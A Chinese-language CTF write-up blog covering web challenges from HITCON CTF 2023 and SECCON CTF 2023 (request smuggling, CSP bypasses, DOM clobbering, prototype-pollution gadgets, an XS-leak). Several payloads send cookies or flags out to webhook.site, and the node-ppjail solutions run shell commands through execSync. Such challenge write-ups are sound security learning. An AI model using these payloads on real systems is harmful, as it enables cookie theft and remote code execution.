---
title: HITCON CTF 2023 與 SECCON CTF 2023 筆記
date: 2023-09-23 15:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/hitcon-seccon-ctf-2023-writeup/cover.png
---

這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。

關鍵字列表：

1. nim json, null byte
2. nim request smuggling
3. js-yaml
4. web worker
5. blob URL
6. meta redirect
7. file protocol & .localhost domain
8. sxg: Signed Exchanges
9. 431 CSP bypass
10. DOM clobbering document.body
11. ejs delimiter
12. Node.js + Deno prototye pollution gadget
13. XSleaks golang sort


<!-- more -->


## HITCON CTF 2023

最近好像很少看到每一題都低於 10 組解出來的 web 題了，上次有這種整場比賽幾乎都是 hard web 可能是 DiceCTF 吧？不過我覺得難度是其次，好玩有趣有學到新東西才是重點，而這些題目在我看來很顯然有做到這點。

先附上兩位作者的 writeup，底下提到作者 writeup 就不額外附連結了：

1. https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/
2. https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023

兩個作者的 writeup 都寫得很詳細，我這邊只是看完之後記錄一些重點而已。

### Login System (7 solves)

這題有兩個 server，node.js 跟 nim，基本上大部分功能都是在 nim server 實現的，你可以登入、註冊以及修改密碼，而使用者的資料會存在 yaml 檔案裡面，目標是要達成 RCE。

第一個洞是 request smuggling，Node.js 接受 `Transfer-Encoding: CHUNKED` 但是 Nim 只看 `chunk`，可以利用這個差異來達成走私的目的。

但走私之後能幹嘛呢？

第二個洞是 Nim 對於 JSON 的行為，先把一個欄位設成很大的數字，Nim 會把它當作是一個 RawNumber，在更新的時候就會不帶引號，可以利用這點來達成 JSON injection。

第三個洞是有了 JSON injection 之後就可以利用 js-yaml 的功能創造出一個有 JS function 的物件，最後利用這個物件會在渲染時呼叫 toString，就達成 RCE 了。

大概會像這樣：

``` js
privilegeLevel: {
  toString: !<tag:yaml.org,2002:js/function> "function (){console.log('hi')}"
}
access: {'profile': true, register: true, login: true}
```

喔對了，還有一個洞是 Nim 的檔案讀取，檔名的部分可以用 null byte 截斷：`test.yaml\u0000`

### Canvas (4 solves)

這題很有趣！

簡單來講就是把你的程式碼丟到 worker 裡面去執行，在 worker 裡面有做一些防護措施，讓你不能存取到 globalThis。就算在 worker 取得了 XSS，從 worker 唯一能做的事情就是往 main thread postMessage，但是結果會經過 `setHTML`，被瀏覽器的 Sanitizer API 給過濾掉。

worker 的 sandbox 滿有趣的，大概像是這樣：

``` js
function allKeys(obj) {
  let keys = []
  while (obj !== null) {
    keys = keys.concat(Object.getOwnPropertyNames(obj))
    keys = keys.concat(Object.keys(Object.getOwnPropertyDescriptors(obj)))
    obj = Object.getPrototypeOf(obj)
  }
  return [...new Set(keys)]
}

function hardening() {
  const fnCons = [function () {}, async function () {}, function* () {}, async function* () {}].map(
    f => f.constructor
  )
  for (const c of fnCons) {
    Object.defineProperty(c.prototype, 'constructor', {
      get: function () {
        throw new Error('Nope')
      },
      set: function () {
        throw new Error('Nope')
      },
      configurable: false
    })
  }
  const cons = [Object, Array, Number, String, Boolean, Date, RegExp, Promise, Symbol, BigInt].concat(fnCons)
  for (const c of cons) {
    Object.freeze(c)
    Object.freeze(c.prototype)
  }
}

const code = `console.log(1)`
const argNames = allKeys(globalThis)
const fn = Function(...argNames, code)
const callUserFn = t => {
  try {
    fn.apply(Object.create(null))
  } catch (e) {
    console.error('User function error', e)
  }
  return true
}

// hardening
hardening()
callUserFn()
```

argNames 是搜集所有 global 能存取到的東西的名稱，這樣就可以把所有東西的名稱都當作是函式的參數丟進去，大概就像是底下這種感覺：

``` js
function run(console, Object, String, Number, fetch,...) {
    
}
```

於是你不管拿到什麼都會是 `undefined`，在呼叫時 this 也傳入了 `Object.create(null)`，所以沒辦法輕易跳出來。

Maple 的預期解是利用 try catch 加上錯誤去拿：

``` js
try {
  null.f()
} catch (e) {
  TypeError = e.constructor
}
Error = TypeError.prototype.__proto__.constructor
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
try{
  null.f()
} catch(e) {
  const g = e.stack[2].getFunction().arguments[0].target
  if (g) { throw { message: g } }
}
```

這招他之前在 DiceCTF 2022 - undefined 這題也用過類似的。

不過對於這題來說有個更容易的解法，利用 this 預設的特性，如下：

``` js
function a() {
   this.console.log('hello') 
}
a()
```

在 JavaScript 裡面，呼叫一個 function 時預設的 this 就會是 global，用這樣就可以繞過限制。

但繞過限制之後要幹嘛呢？在 worker 裡面拿到 XSS 之後好像做不了什麼事情，因為 main thread 的 `setHTML` 會做過濾，而且這題的 CSP 是 `default-src 'self' 'unsafe-eval'`

關鍵就在於 blob URL，可以用 blob 新建一個 HTML 並且載入，這個新 HTML 的 origin 跟原本的是一樣的：

``` js
const u = this.URL.createObjectURL(new this.Blob(['<h1>peko</h1>'], { type: 'text/html' }))
location = u
```

而這題讓我驚訝的地方是原來 `<meta>` 的跳轉也可以跳到 blob URL 去，所以結合 meta redirect 之後就可以把 top level page 變成是自己的 HTML，繞過 sanitizer 的限制。

但此時 CSP 會繼承，所以還是要繞過 CSP，這邊可以再次利用 worker.js，把 worker.js 當作是一般的 script 載入，就能夠在 main thread 底下執行 XSS 了。

這題真的很有趣，blob 的運用方式也很巧妙。

### AMF (4 solves)

有點懶得研究 python 的東西，就先放著吧，作者有寫 writeup。

### Harmony (2 solves)

這題各種 Electron 黑魔法。

在 Chromium 中 `.localhost` 結尾的 domain 在利用 file protocol 時會被忽略，例如說：

```
// fail
file://www.youtube.com.attacker.com/etc/passwd

// success
file://www.youtube.com.localhost/etc/passwd
```

（我怎麼覺得以前我好像有無意間翻到過這一段的 code）

而 file:// 會被 DOMPurify 濾掉，不過因為網頁本來就是 file，所以可以改成用 `//` 來繞過檢查。

接著，`file://` 在 Electorn 裡面都是 same-origin，所以載入自己的檔案以後就可以存取到 top.api

最後再結合一些 prototype pollution 的東西，就可以拿到 RCE（後半段我沒有仔細研究，可參考作者的 writeup）

### Sharer's World (1 solve)

這題的關鍵是一個叫做 SXG 的東西：https://web.dev/signed-exchanges/

在這場比賽以前我完全沒聽過這個，而且 web.dev 上的參考資料居然 2021 就有了，看來我真的是 lag 太久了。

簡單來講呢，SXG 就是可以拿憑證對一個網頁做簽章，如此一來其他網站在發送這個簽過章的資源時，瀏覽器就可以把這個資源視為是有憑證的那個網站。

舉個例子，今天 example.com 的人拿著他們的私鑰對一個網站簽名，產生了一個 example.sxg 檔案，接著我拿到了這個檔案，放到我的主機上，網址是：https://huli.tw/example.sxg

當使用者造訪 https://huli.tw/example.sxg 時，內容會是之前的網站，而網址會變成 example.com，就好像這個網頁是直接從 example.com 出來的一樣。

## SECCON CTF 2023

身為一個 JavaScript 愛好者，這次的 SECCON CTF 的題目我很喜歡，充滿了一堆的 JavaScript。雖然說有些題目沒解出來，但依舊學到很多。

### Bad JWT (107 solves)

這題的目標是要產出一個 `isAdmin: true` 的 JWT，而重點在於驗證 JWT 的邏輯：

``` js
const algorithms = {
  hs256: (data, secret) => 
    base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
  hs512: (data, secret) => 
    base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
}

const createSignature = (header, payload, secret) => {
  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
  const signature = algorithms[header.alg.toLowerCase()](data, secret);
  return signature;
}
```

如果 `header.alg` 是 `constructor`，就會變成 `const signature = Object(data,secret)`，產出的結果會變成一個 string 的物件，而且裡面只含有 data，忽略了 secret：

``` js
console.log(Object("data", "secret")) // String {'data'}
```

因此只要根據這個構造一個相同的 signature 就好。

更詳細的 writeup 可以參考：https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023

### SimpleCalc (23 solves)

這題可以讓你執行任意 JavaScript，但是必須使用 fetch 加上 X-FLAG 這個 header 才能拿到 flag，可是會被 CSP 擋住：

```  js
app.use((req, res, next) => {
  const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
  res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
  next();
});
```

只要製造出一個 header too large 的 response 並用 iframe 嵌入，就能得到一個沒有 CSP 的 same-origin 頁面，繞過 CSP：

``` js
var f=document.createElement('iframe');
f.src = `http://localhost:3000/js/index.js?q=${'a'.repeat(20000)}`;
document.body.appendChild(f);
f.onload = () => {    
    f.contentWindow.fetch('/flag', { headers: {'X-FLAG': 'a'}, credentials:'include' })
        .then(res => res.text())
        .then(flag => location='https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='+flag)
}
```

有趣的是如果用 `window.open` 就不行，看賽後討論是有人說因為 window.open 會把錯誤頁面導到一個 `chrome://error` 之類的地方，所以 origin 會變成 null。

而這題的預期解其實是 service worker，在 http + localhost 底下是可以用 sw 的，靠著 service worker 把 CSP header 拿掉。

底下是 @DimasMaulana 的 exploit：

```py
from urllib.parse import quote

target = "http://localhost:3000"
webhook = "https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"
rmcsp = """
self.addEventListener("fetch", (ev) => {
    console.log(ev)
    let headers = new Headers()
    headers.set("Content-Type","text/html")
    if (/\/js\//.test(ev.request.url)){
        ev.respondWith(new Response("<script>fetch('/flag',{headers:{'X-FLAG':'1'},credentials:'include'}).then(async r=>{location='"""+webhook+"""?'+await r.text()})</script>",{headers}))
    }
});
console.log("registered2")
document = {}
document.getElementById = ()=>{return {innerText:"testing"}}
"""

workerUrl = "/js/index.js?expr="+quote(rmcsp)

payload = "navigator.serviceWorker.register('"+workerUrl+"');setInterval(()=>{location='/js/test'},2000)"

print(payload)
payload = target+"/js/..%2f?expr="+quote(payload)
```

### blink (14 solves)

這題的核心程式碼如下：

``` js
const createBlink = async (html) => {
  const sandbox = wrap(
    $("#viewer").appendChild(document.createElement("iframe"))
  );

  // I believe it is impossible to escape this iframe sandbox...
  sandbox.sandbox = sandboxAttribute;

  sandbox.width = "100%";
  sandbox.srcdoc = html;
  await new Promise((resolve) => (sandbox.onload = resolve));

  const target = wrap(sandbox.contentDocument.body);
  target.popover = "manual";
  const id = setInterval(target.togglePopover, 400);

  return () => {
    clearInterval(id);
    sandbox.remove();
  };
};
```

iframe 的地方沒辦法 bypass sandbox，但重點是 `setInterval(target.togglePopover, 400)` 這一行程式碼。

如果 `target.togglePopover` 是字串的話，就可以拿來當成 eval 用。

而 `target` 是 `sandbox.contentDocument.body`，可以用 `name` 去 DOM clobber `document.body`，接著再去 clobber `togglePopover` 就搞定了。


``` html
<iframe name=body srcdoc="<a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=${document.cookie}`)></a>"></iframe>
```

### eeeeejs (12 solves)

遺憾的一題，試了很久但沒有解開 QQ

這題的核心程式碼如下：

``` js
const ejs = require("ejs");

const { filename, ...query } = JSON.parse(process.argv[2].trim());
ejs.renderFile(filename, query).then(console.log);
```

你可以控制 `filename` 跟 `query`，目標是 XSS。

而 CSP 是 self，意思就是只要做出 `<script src=/>` 跟建構出一個合法的 JS 程式碼就可以拿到 flag 了。

但這邊另一個限制是只能讀取 `src` 底下的檔案，所以你的 template 是有限的。

而解法是利用 EJS 的 options `openDelimiter`、`closeDelimiter` 以及 `delimiter`，讓 EJS 用不同的方式去解析模板。

因為在 EJS 裏面 `<%=` 可以輸出後面接的內容，而 `<%-` 則是可以輸出 unescaped 的內容，所以我一開始的想法是找到符合這種 pattern 的字串，到最後只找到了一半，可以做出 `<script>` 但是屬性內容會被編碼，也找到了合法的 JavaScript 產生方式，總之最後沒做出來。

賽後看了一下其他人的解法，才意識到我忘記了這題是呼叫 node.js 以後輸出，作者的解法是把 debug 設成 true，就可以讓 EJS 輸出 src，而 src 會包含 filename，再利用 filename 可以是一個 object 的特性來傳入任意內容。

或是也可以直接把 `console.log(src)` 放到 template 裡面去。

舉例來說，有一段文字如下：

``` js
  if (opts.debug) {
    console.log(src);
  }
  if (opts.compileDebug && opts.filename) {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
  }
  // other codes
```

當我們這樣做以後：

``` js
ejs.renderFile('test', {
  'src': {
    helllo: 'world'
  },
  settings: {
    'view options': {
      delimiter: ' ',
      openDelimiter: 'if (opts.debug)',
      closeDelimiter: " if (opts.compileDebug && opts.filename)"
    }
  }
}).then(r => console.log(r));
```

輸出會是：

```
{ helllo: 'world' }
   {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
  }
  // other codes
```

之所以會這樣，是因為把 delimiter 改掉以後，上面那段文字就等同於是：

``` js
<% {
    console.log(src);
  } %> {
    src = src + "\n//# sourceURL=" + sanitizedFilename + "\n";
  }
  // other codes
```

因此就等同於是執行了 `console.log(src)`，所以 src 就會出現在輸出裡面。

### node-ppjail (5 solves)

這題可以讓你污染 prototype 上面的東西，而且值可以是 function，但問題是不能污染已經有的屬性。

解法是觸發錯誤之後，去找 Node.js 底層會幹嘛，然後污染相對應的屬性。

一個簡單的範例是：

``` js
Object.prototype.prepareStackTrace = function(){
  console.log('pwn')
}
Object.toString.arguments
```

輸出為：

```
pwn
/js/pp.js:4
Object.toString.arguments
                ^

[TypeError: 'caller', 'callee', and 'arguments' properties may not be accessed on strict mode functions or the arguments objects for calls to them]

Node.js v20.0.0
```

至於要怎麼找出這屬性，學 [maple](https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox) 去 patch V8 似乎是個不錯的選擇。

而作者則是有找到另外兩種方法，在這邊留個紀錄以後比較好找，來源是[作者的 writeup](https://blog.arkark.dev/2023/09/21/seccon-quals/)：

``` py
def solve1() -> str:
    # Solution 1:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77
            "1": {
                "callback": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
        },
    })


def solve2() -> str:
    # Solution 2:
    return json.dumps({
        "__proto__": {
            # ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064
            "circular": {
                "get": {
                    "__custom__": True,
                    "type": "Function",
                    "args": [
                        f"console.log(global.process.mainModule.require('child_process').execSync('{command}').toString())"
                    ],
                },
            },
            # ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause
            "cause": 1,
        },
        # Cause an error
        "toString": {
            "caller": {},
        },
    })
```

### deno-ppjail (2 solves)

跟上一題類似，但是是要找 deno 的 gadget。

作者找到的 gadget 是 `Object.prototype.return`

而 maple 找到的是 cause + circular.get，@parrot409 找到的是 `nodeProcessUnhandledRejectionCallback`

更詳細的說明可以參考 maple 的 writeup：https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail

### hidden-note (1 solve)

這題也很有趣，題目就是經典的那種 XS leaks 的類型，有搜尋功能，只是搜尋結果會把 flag 給 filter 掉。

搜尋結果的頁面可以用 meta redirect 洩漏出來，所以是可以看到結果頁面的。只是結果頁面已經把 flag 去掉了，那還可以做些什麼呢？

在搜尋的時候，會把結果先排序，排序完以後再把 flag 去掉，而這一題所使用的排序方法在元素 <= 12 個的時候會是 stable sort，>12 個就是 unstable sort。

因此，我們可以先建立恰好 12 個 note，內容為：`ECCON{@|ECCON{a|ECCON{b|...`

假如 flag 是 `SECCON{abc}` 好了，在搜尋 `ECCON{@` 時，因為總數是 12 個，所以是 stable sort，最後搜尋結果頁面的 id 順序不會變。

但如果是搜尋 `ECCON{a`，結果就變成 13 個，此時變成 unstable sort，note 的順序變了。

因此，可以從結果頁面的內容知道原始搜尋的結果是 12 個以內還是超過 12 個，就可以把這個當作 oracle，進而 leak 出 flag。

這個解法真的很酷，非常新穎！無論是出題的 Ark 還是解開的 maple，都真的好強

